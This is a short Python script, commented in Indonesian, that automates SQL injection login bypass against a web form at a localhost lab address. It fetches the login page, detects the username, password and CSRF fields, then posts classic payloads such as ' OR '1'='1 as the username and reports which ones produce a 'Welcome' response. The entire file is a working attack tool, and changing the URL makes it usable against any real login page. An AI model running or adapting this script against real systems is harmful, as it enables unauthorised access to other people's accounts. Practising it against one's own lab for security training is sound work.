import requests
from bs4 import BeautifulSoup

# ===== Konfigurasi =====
url = "http://localhost:8080/index.php/login"  # URL login lab
password = "password"                          # password tetap untuk testing
payloads = ["' OR '1'='1", "' OR '1'='2", "' OR ''='"]
default_success_text = "Welcome"              # fallback teks sukses login

# ===== Mulai sesi =====
session = requests.Session()

# Ambil halaman login
r = session.get(url)
soup = BeautifulSoup(r.text, "html.parser")

# Deteksi username dan password field
username_input = soup.find("input", {"type": "text"})
password_input = soup.find("input", {"type": "password"})

if not username_input or not password_input:
    print("Tidak bisa menemukan input username/password di halaman.")
    exit(1)

username_field = username_input.get("name")
password_field = password_input.get("name")
print(f"Deteksi field: username='{username_field}', password='{password_field}'")

# Cek CSRF token (input hidden)
csrf_input = soup.find("input", {"type": "hidden"})
csrf_field = csrf_input.get("name") if csrf_input else None
csrf_token = csrf_input.get("value") if csrf_input else None
if csrf_field:
    print(f"Deteksi CSRF token: {csrf_field}={csrf_token}")

# ===== Test payloads =====
for payload in payloads:
    data = {
        username_field: payload,
        password_field: password
    }
    if csrf_field:
        data[csrf_field] = csrf_token

    response = session.post(url, data=data)

    # Deteksi teks sukses login
    success_text = default_success_text
    if success_text in response.text:
        print(f"[+] Payload berhasil: {payload}")
    else:
        print(f"[-] Payload gagal: {payload}")
